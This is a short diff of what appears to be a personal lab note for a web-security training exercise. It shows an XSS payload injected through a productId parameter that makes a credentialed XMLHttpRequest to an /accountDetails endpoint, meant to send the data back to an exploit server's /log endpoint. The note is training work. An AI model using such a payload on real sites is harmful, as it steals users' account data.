@@ -10,7 +10,7 @@ XSS PoC to relocate to /accountDetails endpoint:
 need to find a way of sending the info back to the /log endpoint on the exploit server.
 to do this we use the following code in the XSS part of productId:
 <script>
-var req = XMLHttpRequest();
+var req = new XMLHttpRequest();
 req.onload = reqListener; 
 req.open('get', 'https://0aa000e40481c179800435c900690023.web-security-academy.net/accountDetails', true);
 req.withCredentials = true;
